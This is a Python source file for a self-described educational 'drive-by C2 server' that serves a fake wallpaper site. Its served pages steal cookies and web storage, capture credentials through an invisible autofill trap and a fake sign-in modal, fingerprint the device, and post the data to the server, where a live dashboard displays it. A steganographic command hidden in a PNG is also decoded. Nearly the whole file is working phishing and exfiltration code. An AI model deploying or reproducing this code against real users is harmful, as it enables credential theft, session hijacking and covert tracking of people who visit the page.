"""
c2_server.py — Drive-By C2 Server (Clean Final)
Cookie theft, autofill trap, storage dump, fingerprinting, stego payload.

EDUCATIONAL LAB ONLY.
Run: python c2_server.py --image samples/stego.png --port 8080

DEMO FLOW:
  1. Open emulator Chrome
  2. Go to http://10.0.2.2:8080/setup   (plants cookies, auto-redirects)
  3. Watch dashboard go RED
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from rich.console import Console
from rich.live import Live
from rich.layout import Layout
from rich.panel import Panel
from rich.table import Table
from rich import box
from pathlib import Path
from PIL import Image
import threading, argparse, json, time, sys, os, socket

console    = Console()
state_lock = threading.Lock()
state = {
    "start_time":    time.time(),
    "connections":   [],
    "exfil_data":    [],
    "page_hits":     0,
    "setup_hits":    0,
    "image_fetches": 0,
    "exfil_count":   0,
    "total_hits":    0,
    "server_ip":     "",
    "server_port":   0,
    "stego_path":    "",
    "payload":       "",
}

BANNER = r"""
  ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
 ██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
 ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
 ██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
 ╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
  ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
"""


# ─────────────────────────────────────────────────────────────
#  LSB DECODER
# ─────────────────────────────────────────────────────────────

def decode_stego(path):
    try:
        img  = Image.open(path).convert("RGB")
        bits = [c & 1 for px in img.getdata() for c in px]
        if len(bits) < 32:
            return "[empty]"
        n = int("".join(map(str, bits[:32])), 2)
        if not n or n > (len(bits) - 32) // 8:
            return "[no payload]"
        raw = bytearray()
        for i in range(n):
            b = 0
            for j in range(8):
                b = (b << 1) | bits[32 + i * 8 + j]
            raw.append(b)
        return raw.decode("utf-8", errors="replace")
    except Exception as e:
        return "[err: " + str(e) + "]"


# ─────────────────────────────────────────────────────────────
#  SETUP PAGE — plants cookies + localStorage
# ─────────────────────────────────────────────────────────────

def get_setup_page():
    html = """<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WallpaperHD - Initializing</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#0f0f13;color:#fff;font-family:Arial,sans-serif;
       min-height:100vh;display:flex;align-items:center;justify-content:center}
  .box{text-align:center;padding:40px;width:100%;max-width:400px}
  .logo{font-size:2em;font-weight:900;margin-bottom:6px}
  .logo span{color:#e94560}
  .sub{color:#8892a4;margin-bottom:40px;font-size:.95em}
  .steps{text-align:left;margin:0 auto 32px}
  .step{display:flex;align-items:center;gap:12px;margin-bottom:14px;
        color:#8892a4;font-size:.9em;transition:color .3s}
  .step .icon{width:28px;height:28px;border-radius:50%;background:#1a1a2e;
              border:1px solid #2a2a4e;display:flex;align-items:center;
              justify-content:center;font-size:.8em;flex-shrink:0;transition:all .3s}
  .step.done .icon{background:#e94560;border-color:#e94560;content:"ok"}
  .step.done{color:#fff}
  .bar-bg{background:#1a1a2e;border-radius:20px;height:8px;overflow:hidden;margin:0 auto}
  .bar{background:linear-gradient(90deg,#e94560,#7c3aed);
       height:100%;width:0%;border-radius:20px;transition:width .5s ease}
  .status{color:#8892a4;font-size:.85em;margin-top:14px}
</style>
</head><body>
<div class="box">
  <div class="logo">Wallpaper<span>HD</span></div>
  <div class="sub">Setting up your experience...</div>
  <div class="steps">
    <div class="step" id="s1"><div class="icon">1</div>Connecting to server</div>
    <div class="step" id="s2"><div class="icon">2</div>Loading preferences</div>
    <div class="step" id="s3"><div class="icon">3</div>Syncing wallpapers</div>
    <div class="step" id="s4"><div class="icon">4</div>Preparing collection</div>
  </div>
  <div class="bar-bg"><div class="bar" id="bar"></div></div>
  <div class="status" id="status">Initializing...</div>
</div>
<script>
var bar    = document.getElementById("bar");
var status = document.getElementById("status");

function markDone(id, pct, msg) {
  document.getElementById(id).classList.add("done");
  bar.style.width = pct + "%";
  status.textContent = msg;
}

setTimeout(function() {
  markDone("s1", 25, "Connection established...");
  document.cookie = "sessionid=eyJhbGciOiJIUzI1NiJ9.victim_session_8472; path=/; max-age=86400";
  document.cookie = "auth_token=Bearer_xK9mN2pQr8L5vT3w; path=/; max-age=86400";
  document.cookie = "user_id=uid_84720; path=/; max-age=86400";
  document.cookie = "remember_me=true; path=/; max-age=86400";
  document.cookie = "cart_session=cart_ff91a3b2c7; path=/; max-age=86400";
}, 600);

setTimeout(function() {
  markDone("s2", 50, "Loading your preferences...");
  try {
    localStorage.setItem("user_email",    "victim@gmail.com");
    localStorage.setItem("user_name",     "Alex Victim");
    localStorage.setItem("saved_address", "Koninginnegracht 12, Den Haag, NL");
    localStorage.setItem("phone",         "+31 6 12345678");
    localStorage.setItem("last_search",   "bitcoin wallet recovery phrase");
    localStorage.setItem("payment_hint",  "Visa ending 4242");
    sessionStorage.setItem("temp_token",  "sess_tmp_xR7kP2mN9q");
    sessionStorage.setItem("login_time",  new Date().toISOString());
  } catch(e) {}
}, 1400);

setTimeout(function() {
  markDone("s3", 75, "Syncing wallpaper collection...");
}, 2200);

setTimeout(function() {
  markDone("s4", 100, "All done! Redirecting...");
  setTimeout(function() {
    window.location.href = "/";
  }, 800);
}, 3000);
</script>
</body></html>"""
    return html.encode("utf-8")


# ─────────────────────────────────────────────────────────────
#  MAIN ATTACK PAGE
# ─────────────────────────────────────────────────────────────

def get_attack_page(port):
    html = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WallpaperHD - Free 4K Wallpapers</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:Arial,sans-serif;background:#0f0f13;color:#fff;min-height:100vh}
  header{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:18px 24px;
         display:flex;align-items:center;justify-content:space-between}
  .logo{font-size:1.5em;font-weight:800}
  .logo span{color:#e94560}
  .badge{background:#e94560;color:#fff;font-size:.7em;padding:3px 10px;
         border-radius:20px;font-weight:700}
  .hero{padding:60px 24px 40px;text-align:center;
        background:linear-gradient(180deg,#16213e,#0f0f13)}
  .hero h1{font-size:2.4em;font-weight:900;margin-bottom:12px}
  .hero h1 em{color:#e94560;font-style:normal}
  .hero p{color:#8892a4;max-width:480px;margin:0 auto 28px}
  .tags{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-bottom:32px}
  .tag{background:#1a1a2e;border:1px solid #2a2a4e;color:#8892a4;
       padding:6px 14px;border-radius:20px;font-size:.82em}
  .section{padding:28px 20px}
  .section h2{font-size:1.15em;font-weight:700;margin-bottom:16px}
  .section h2 span{color:#e94560}
  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px}
  .card{border-radius:12px;overflow:hidden;aspect-ratio:9/16;
        position:relative;cursor:pointer;transition:transform .2s}
  .card:hover{transform:scale(1.03)}
  .label{position:absolute;bottom:0;left:0;right:0;padding:10px 12px;
         background:linear-gradient(transparent,rgba(0,0,0,0.7));
         font-size:.8em;color:#ddd;font-weight:600}
  .views{position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.5);
         border-radius:10px;padding:2px 8px;font-size:.7em;color:#ccc}
  .new{position:absolute;top:8px;left:8px;background:#e94560;
       border-radius:10px;padding:2px 8px;font-size:.7em;font-weight:700}
  .modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);
            z-index:100;align-items:center;justify-content:center}
  .modal-bg.show{display:flex}
  .modal{background:#1a1a2e;border:1px solid #e94560;border-radius:16px;
         padding:32px;width:90%;max-width:380px;text-align:center}
  .modal h2{font-size:1.3em;margin-bottom:8px}
  .modal p{color:#8892a4;font-size:.9em;margin-bottom:24px}
  .modal input{width:100%;background:#0f0f1a;border:1px solid #2a2a4e;
               color:#fff;padding:12px 16px;border-radius:8px;font-size:1em;
               margin-bottom:12px;outline:none}
  .modal input:focus{border-color:#e94560}
  .modal-btn{width:100%;background:#e94560;color:#fff;border:none;
             padding:14px;border-radius:8px;font-size:1em;font-weight:700;cursor:pointer}
  .skip{color:#555;font-size:.85em;margin-top:16px;display:block;cursor:pointer}
  .dl-bar{position:fixed;bottom:0;left:0;right:0;background:#1a1a2e;
          border-top:1px solid #2a2a4e;padding:14px 20px;
          display:flex;align-items:center;gap:14px;
          transform:translateY(100%);transition:transform .4s ease}
  .dl-bar.show{transform:translateY(0)}
  .dl-info{flex:1}
  .dl-info strong{display:block;font-size:.95em;margin-bottom:2px}
  .dl-info span{font-size:.78em;color:#8892a4}
  .dl-btn{background:#e94560;color:#fff;border:none;padding:10px 22px;
          border-radius:8px;font-weight:700;font-size:.9em;cursor:pointer}
  #dot{position:fixed;top:12px;right:12px;width:8px;height:8px;
       border-radius:50%;background:#222;transition:background .3s;z-index:200}
  #dot.pulse{background:#00ff41;box-shadow:0 0 10px #00ff41;animation:p 1s infinite}
  #dot.done{background:#e94560;box-shadow:0 0 8px #e94560;animation:none}
  @keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
  .trap{position:absolute;left:-9999px;top:-9999px;
        width:1px;height:1px;opacity:0;pointer-events:none}
  footer{text-align:center;padding:28px;color:#3a3a5a;font-size:.8em}
</style>
</head><body>

<div id="dot"></div>

<!-- Autofill trap: invisible, password managers autofill these -->
<form class="trap" autocomplete="on">
  <input type="text"     id="tUser"  autocomplete="username">
  <input type="email"    id="tEmail" autocomplete="email">
  <input type="password" id="tPass"  autocomplete="current-password">
</form>

<header>
  <div class="logo">Wallpaper<span>HD</span></div>
  <div style="display:flex;gap:12px;align-items:center">
    <span style="color:#8892a4;font-size:.85em">47,291 wallpapers</span>
    <div class="badge">FREE</div>
  </div>
</header>

<div class="hero">
  <h1>Premium 4K Walls<br><em>Always Free.</em></h1>
  <p>Curated daily. No watermarks. No login required.</p>
  <div class="tags">
    <div class="tag">Abstract</div>
    <div class="tag">Nature</div>
    <div class="tag">City</div>
    <div class="tag">Space</div>
    <div class="tag">Gaming</div>
    <div class="tag">Sci-Fi</div>
  </div>
</div>

<div class="section">
  <h2>Trending <span>Today</span></h2>
  <div class="grid" id="gallery"></div>
</div>

<!-- Fake login modal (shown when user taps a card) -->
<div class="modal-bg" id="modal">
  <div class="modal">
    <h2>Save to Collection</h2>
    <p>Sign in to sync wallpapers across your devices</p>
    <input type="email"    id="mEmail" placeholder="Email address"  autocomplete="email">
    <input type="password" id="mPass"  placeholder="Password"       autocomplete="current-password">
    <button class="modal-btn" onclick="submitLogin()">Sign In</button>
    <span class="skip" onclick="skipLogin()">Continue without signing in</span>
  </div>
</div>

<div class="dl-bar" id="dlBar">
  <div class="dl-info">
    <strong>WallpaperHD App</strong>
    <span>10,000+ walls &bull; Offline mode &bull; 4K quality</span>
  </div>
  <button class="dl-btn">Free Download</button>
</div>

<footer>&copy; 2024 WallpaperHD &bull; Privacy Policy &bull; Terms</footer>

<script>
// ── Build gallery
var C = [
  ["#0d0221","#7c3aed"],["#021d0d","#059669"],["#1a0521","#db2777"],
  ["#0a0d21","#2563eb"],["#1a0a00","#d97706"],["#001a1a","#0891b2"],
  ["#1a1a00","#ca8a04"],["#0a001a","#7c3aed"],["#00001a","#1d4ed8"],
  ["#1a0010","#e11d48"],["#001a0d","#16a34a"],["#0f0a1a","#9333ea"]
];
var L = [
  "Cosmic Drift","Neon Forest","Cherry Blossom","Deep Ocean",
  "Amber Dusk","Arctic Frost","Golden Hour","Void Space",
  "Midnight Blue","Rose Quartz","Emerald Isle","Purple Rain"
];
var V = ["2.1k","847","3.4k","1.2k","5.6k","923","4.1k","761","2.8k","1.9k","3.3k","608"];

var gal = document.getElementById("gallery");
for (var i = 0; i < C.length; i++) {
  (function(idx) {
    var d = document.createElement("div");
    d.className = "card";
    d.style.background = "linear-gradient(160deg," + C[idx][0] + "," + C[idx][1] + ")";
    d.innerHTML = (idx < 3 ? '<div class="new">NEW</div>' : "")
      + '<div class="views">' + V[idx] + "</div>"
      + '<div class="label">' + L[idx] + "</div>";
    d.onclick = function() {
      document.getElementById("modal").classList.add("show");
    };
    gal.appendChild(d);
  })(i);
}

setTimeout(function() {
  document.getElementById("dlBar").classList.add("show");
}, 3500);

// ── Modal handlers
function submitLogin() {
  var e = document.getElementById("mEmail").value;
  var p = document.getElementById("mPass").value;
  document.getElementById("modal").classList.remove("show");
  doExfil(e, p, "USER_TYPED");
}
function skipLogin() {
  document.getElementById("modal").classList.remove("show");
  doExfil("", "", "MODAL_SKIPPED");
}

// ── Data collectors
function readCookies() {
  return document.cookie || "[no cookies accessible]";
}

function readStorage() {
  var out = {};
  try {
    for (var i = 0; i < localStorage.length; i++) {
      var k = localStorage.key(i);
      out["local::" + k] = localStorage.getItem(k);
    }
  } catch(e) {}
  try {
    for (var i = 0; i < sessionStorage.length; i++) {
      var k = sessionStorage.key(i);
      out["session::" + k] = sessionStorage.getItem(k);
    }
  } catch(e) {}
  var keys = Object.keys(out);
  return keys.length > 0 ? JSON.stringify(out) : "[storage empty]";
}

function readAutofill() {
  return {
    user:  document.getElementById("tUser").value  || "[empty]",
    email: document.getElementById("tEmail").value || "[empty]",
    pass:  document.getElementById("tPass").value  || "[empty]"
  };
}

function readFingerprint() {
  var conn = navigator.connection || {};
  var gpu  = "unknown";
  try {
    var c  = document.createElement("canvas");
    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (gl) {
      var dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    }
  } catch(e) {}
  return {
    user_agent:   navigator.userAgent,
    screen:       screen.width + "x" + screen.height + " @" + devicePixelRatio + "x",
    timezone:     Intl.DateTimeFormat().resolvedOptions().timeZone,
    language:     navigator.language,
    platform:     navigator.platform || "unknown",
    touch_points: navigator.maxTouchPoints,
    memory_gb:    navigator.deviceMemory  || "unknown",
    cpu_cores:    navigator.hardwareConcurrency || "unknown",
    connection:   conn.effectiveType || "unknown",
    gpu_renderer: gpu,
    do_not_track: navigator.doNotTrack || "unset",
    cookies_on:   navigator.cookieEnabled
  };
}

// ── Main exfil
function doExfil(typedEmail, typedPass, src) {
  var af = readAutofill();
  var fp = readFingerprint();
  var data = {
    c2_command:    window._cmd || "[loading]",
    status:        "COMPROMISED",
    cred_source:   src || "AUTO",
    typed_email:   typedEmail || "[not typed]",
    typed_pass:    typedPass  || "[not typed]",
    autofill_user: af.user,
    autofill_email:af.email,
    autofill_pass: af.pass,
    cookies:       readCookies(),
    local_storage: readStorage(),
    user_agent:    fp.user_agent,
    screen:        fp.screen,
    timezone:      fp.timezone,
    language:      fp.language,
    platform:      fp.platform,
    touch_points:  fp.touch_points,
    memory_gb:     fp.memory_gb,
    cpu_cores:     fp.cpu_cores,
    connection:    fp.connection,
    gpu_renderer:  fp.gpu_renderer,
    do_not_track:  fp.do_not_track,
    timestamp:     new Date().toISOString()
  };
  fetch("/collect", {
    method:  "POST",
    headers: {"Content-Type": "application/json"},
    body:    JSON.stringify(data)
  }).then(function() {
    var dot = document.getElementById("dot");
    dot.classList.remove("pulse");
    dot.classList.add("done");
  }).catch(function() {});
}

// ── Attack chain — fires on page load
document.getElementById("dot").classList.add("pulse");
window._cmd = "[loading]";

// Get decoded stego command from server
fetch("/api/cmd")
  .then(function(r) { return r.json(); })
  .then(function(j) { window._cmd = j.cmd; })
  .catch(function() {});

// Wait 2.5s for autofill trap to fill, then fire
setTimeout(function() {
  doExfil("", "", "AUTOFILL_TRAP");
}, 2500);

// Also attempt canvas LSB decode (visual bonus)
fetch("/wallpaper.png?t=" + Date.now())
  .then(function(r) { return r.arrayBuffer(); })
  .then(function(buf) {
    var blob = new Blob([buf], {type: "image/png"});
    var url  = URL.createObjectURL(blob);
    var img  = new Image();
    img.onload = function() {
      try {
        var cvs = document.createElement("canvas");
        cvs.width  = img.width;
        cvs.height = img.height;
        var ctx = cvs.getContext("2d");
        ctx.drawImage(img, 0, 0);
        var px   = ctx.getImageData(0, 0, img.width, img.height).data;
        var bits = [];
        for (var i = 0; i < px.length && bits.length < 400032; i++) {
          if ((i + 1) % 4 === 0) continue;
          bits.push(px[i] & 1);
        }
        var len = 0;
        for (var i = 0; i < 32; i++) len = (len << 1) | bits[i];
        if (len > 0 && len <= (bits.length - 32) / 8) {
          var out = [];
          for (var i = 0; i < len; i++) {
            var byt = 0;
            for (var j = 0; j < 8; j++) byt = (byt << 1) | bits[32 + i * 8 + j];
            out.push(byt);
          }
          window._cmd = new TextDecoder().decode(new Uint8Array(out));
          console.log("[stego-x] canvas decoded:", window._cmd);
        }
      } catch(e) {
        console.log("[stego-x] canvas blocked, /api/cmd used as fallback");
      }
      URL.revokeObjectURL(url);
    };
    img.src = url;
  })
  .catch(function() {});
</script>
</body></html>"""
    return html.encode("utf-8")


# ─────────────────────────────────────────────────────────────
#  HTTP HANDLER
# ─────────────────────────────────────────────────────────────

class C2Handler(BaseHTTPRequestHandler):

    def log_message(self, *a):
        pass

    def _log(self, method, action, size, color="white"):
        with state_lock:
            state["total_hits"] += 1
            state["connections"].append({
                "time":   time.strftime("%H:%M:%S"),
                "ip":     self.client_address[0],
                "port":   self.client_address[1],
                "method": method,
                "action": action,
                "bytes":  size,
                "color":  color,
            })

    def _send(self, code, ctype, body, extra=None):
        self.send_response(code)
        self.send_header("Content-Type",   ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Server",         "nginx/1.24.0")
        self.send_header("Access-Control-Allow-Origin",  "*")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        if extra:
            for k, v in extra.items():
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin",  "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()

    def do_GET(self):

        # /setup — plants cookies and localStorage, then redirects to /
        if self.path == "/setup":
            body = get_setup_page()
            self.send_response(200)
            self.send_header("Content-Type",   "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Server",         "nginx/1.24.0")
            self.send_header("Access-Control-Allow-Origin", "*")
            # Server-side cookies (no HttpOnly — JS can read them)
            self.send_header("Set-Cookie",
                "server_session=srv_a9f3c7e2b1d8; path=/; max-age=86400")
            self.send_header("Set-Cookie",
                "tracking_id=trk_5f2a9c8e1b4d; path=/; max-age=86400")
            self.send_header("Set-Cookie",
                "pref_theme=dark; path=/; max-age=86400")
            self.end_headers()
            self.wfile.write(body)
            with state_lock:
                state["setup_hits"] += 1
            self._log("GET", "COOKIES PLANTED", len(body), "magenta")

        # / — main attack page
        elif self.path in ("/", "/index.html"):
            body = get_attack_page(state["server_port"])
            self._send(200, "text/html; charset=utf-8", body)
            with state_lock:
                state["page_hits"] += 1
            self._log("GET", "VICTIM VISITED PAGE", len(body), "cyan")

        # /wallpaper.png — stego image
        elif self.path.startswith("/wallpaper.png"):
            p = state["stego_path"]
            if Path(p).exists():
                data = Path(p).read_bytes()
                self._send(200, "image/png", data,
                           {"Cache-Control": "no-store, no-cache"})
                with state_lock:
                    state["image_fetches"] += 1
                self._log("GET", "STEGO IMG FETCHED", len(data), "yellow")
            else:
                self._send(404, "text/plain", b"not found")

        # /api/cmd — returns decoded stego payload as JSON
        elif self.path == "/api/cmd":
            cmd  = state["payload"] or "[no payload]"
            body = json.dumps({"cmd": cmd}).encode("utf-8")
            self._send(200, "application/json", body)

        elif self.path == "/favicon.ico":
            self._send(204, "text/plain", b"")

        else:
            self._send(404, "text/plain", b"not found")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw    = self.rfile.read(length)
        self._send(200, "application/json", b'{"status":"ok"}')

        try:
            exfil = json.loads(raw.decode("utf-8"))
        except Exception:
            exfil = {"raw": raw.decode("utf-8", errors="replace")}

        with state_lock:
            state["exfil_count"] += 1
            state["exfil_data"].append({
                "time": time.strftime("%H:%M:%S"),
                "ip":   self.client_address[0],
                "data": exfil,
                "size": len(raw),
            })
        self._log("POST", "DATA EXFILTRATED", len(raw), "red")


# ─────────────────────────────────────────────────────────────
#  LIVE DASHBOARD
# ─────────────────────────────────────────────────────────────

def render():
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=12),
        Layout(name="mid",    size=14),
        Layout(name="exfil",  size=26),
        Layout(name="foot",   size=3),
    )
    layout["mid"].split_row(
        Layout(name="stats", ratio=1),
        Layout(name="log",   ratio=2),
    )

    up      = int(time.time() - state["start_time"])
    h, m, s = up // 3600, (up % 3600) // 60, up % 60
    pay     = state["payload"]
    prev    = (pay[:52] + "...") if len(pay) > 52 else pay

    layout["header"].update(Panel(
        f"[bold green]{BANNER}[/bold green]\n"
        f"  [dim]STEP 1 :[/dim]  "
        f"[magenta]http://10.0.2.2:{state['server_port']}/setup[/magenta]"
        f"  [dim]<-- visit this first (plants cookies)[/dim]\n"
        f"  [dim]STEP 2 :[/dim]  "
        f"[cyan]http://10.0.2.2:{state['server_port']}[/cyan]"
        f"  [dim]<-- auto-redirected here | PAYLOAD:[/dim] "
        f"[red]\"{prev}\"[/red]   "
        f"[dim]UPTIME:[/dim] [green]{h:02d}:{m:02d}:{s:02d}[/green]",
        border_style="green", padding=(0, 1)
    ))

    st = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    st.add_column("K", style="cyan",  width=20)
    st.add_column("V", style="white", width=12)
    st.add_row("SETUP VISITS",   f"[magenta]{state['setup_hits']}[/magenta]")
    st.add_row("PAGE VISITS",    f"[cyan]{state['page_hits']}[/cyan]")
    st.add_row("STEGO FETCHES",  f"[yellow]{state['image_fetches']}[/yellow]")
    st.add_row("EXFIL SESSIONS", f"[bold red]{state['exfil_count']}[/bold red]")
    st.add_row("TOTAL HITS",     str(state["total_hits"]))
    st.add_row("", "")
    st.add_row("[dim]COOKIE THEFT[/dim]",  "[green]OK[/green]")
    st.add_row("[dim]AUTOFILL TRAP[/dim]", "[green]OK[/green]")
    st.add_row("[dim]STORAGE DUMP[/dim]",  "[green]OK[/green]")
    st.add_row("[dim]FINGERPRINT[/dim]",   "[green]OK[/green]")
    layout["stats"].update(Panel(st,
        title="[bold green][ METRICS ][/bold green]", border_style="green"))

    lg = Table(box=box.SIMPLE, show_header=True,
               header_style="bold green", padding=(0, 1))
    lg.add_column("TIME",   style="dim",    width=10)
    lg.add_column("SOURCE", style="cyan",   width=20)
    lg.add_column("M",      style="white",  width=5)
    lg.add_column("ACTION", style="bold",   width=24)
    lg.add_column("B",      style="yellow", width=8)
    for c in state["connections"][-10:]:
        clr = c.get("color", "white")
        lg.add_row(
            c["time"],
            f"{c['ip']}:{c['port']}",
            c["method"],
            f"[{clr}]{c['action']}[/{clr}]",
            str(c["bytes"])
        )
    layout["log"].update(Panel(lg,
        title="[bold green][ LIVE CONNECTION LOG ][/bold green]", border_style="green"))

    if state["exfil_data"]:
        latest = state["exfil_data"][-1]
        d      = latest["data"]

        lines = (
            f"[bold red]VICTIM COMPROMISED  "
            f"[{latest['time']}]  FROM {latest['ip']}[/bold red]\n\n"
        )

        sections = [
            ("STEGO COMMAND", [
                ("c2_command",  "bold red"),
                ("status",      "bold red"),
                ("cred_source", "yellow"),
            ]),
            ("CREDENTIALS", [
                ("typed_email",    "bold yellow"),
                ("typed_pass",     "bold yellow"),
                ("autofill_user",  "yellow"),
                ("autofill_email", "yellow"),
                ("autofill_pass",  "bold yellow"),
            ]),
            ("COOKIES", [
                ("cookies", "yellow"),
            ]),
            ("LOCAL STORAGE", [
                ("local_storage", "yellow"),
            ]),
            ("DEVICE FINGERPRINT", [
                ("screen",       "white"),
                ("timezone",     "white"),
                ("platform",     "white"),
                ("gpu_renderer", "white"),
                ("memory_gb",    "white"),
                ("cpu_cores",    "white"),
                ("connection",   "white"),
                ("touch_points", "white"),
                ("user_agent",   "dim"),
                ("timestamp",    "dim"),
            ]),
        ]

        for sec_name, fields in sections:
            sec_lines = []
            for key, color in fields:
                if key in d:
                    val     = str(d[key])
                    display = (val[:65] + "...") if len(val) > 65 else val
                    skip    = display in ("[not typed]", "[empty]", "unknown", "unset")
                    if not skip:
                        sec_lines.append(
                            f"  [cyan]{key.upper():<22}[/cyan] [{color}]{display}[/{color}]"
                        )
            if sec_lines:
                lines += f"[dim]  -- {sec_name} --[/dim]\n"
                lines += "\n".join(sec_lines) + "\n\n"

        lines += f"  [dim]Sessions: {state['exfil_count']} | Bytes: {latest['size']}[/dim]"

        layout["exfil"].update(Panel(lines,
            title="[bold red][ EXFILTRATED -- COOKIES | CREDENTIALS | STORAGE | FINGERPRINT ][/bold red]",
            border_style="red"))
    else:
        layout["exfil"].update(Panel(
            f"[dim]No victims yet.\n\n"
            f"  [magenta]STEP 1[/magenta]  Open Chrome on emulator\n"
            f"  [magenta]       [/magenta]  Go to http://10.0.2.2:{state['server_port']}/setup\n"
            f"  [magenta]       [/magenta]  Waits 3s, plants cookies, auto-redirects\n\n"
            f"  [cyan]STEP 2[/cyan]  Attack fires automatically on main page\n"
            f"  [cyan]      [/cyan]  Collects: cookies, storage, fingerprint, autofill\n\n"
            f"  [yellow]BONUS [/yellow]  Tap any wallpaper card -> fake login modal\n"
            f"  [yellow]      [/yellow]  Whatever victim types shows here live[/dim]",
            title="[dim][ WAITING FOR VICTIM ][/dim]", border_style="dim"))

    layout["foot"].update(Panel(
        "[dim]CTRL+C to stop  |  Educational simulation  |  Local lab only[/dim]",
        border_style="dim"))
    return layout


# ─────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(description="STEGO-X C2 Server")
    p.add_argument("--image", required=True, help="Stego PNG to serve")
    p.add_argument("--port",  type=int, default=8080)
    p.add_argument("--host",  default="0.0.0.0")
    a = p.parse_args()

    if not Path(a.image).exists():
        console.print(f"[red]X Image not found: {a.image}[/red]")
        sys.exit(1)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        local_ip = "127.0.0.1"

    with state_lock:
        state.update({
            "server_ip":   local_ip,
            "server_port": a.port,
            "stego_path":  a.image,
            "payload":     decode_stego(a.image),
        })

    server = HTTPServer((a.host, a.port), C2Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()

    console.clear()
    try:
        with Live(render(), console=console,
                  refresh_per_second=4, screen=True) as live:
            while True:
                live.update(render())
                time.sleep(0.25)
    except KeyboardInterrupt:
        console.print("\n[bold red][ C2 SERVER STOPPED ][/bold red]")
        server.shutdown()


if __name__ == "__main__":
    main()
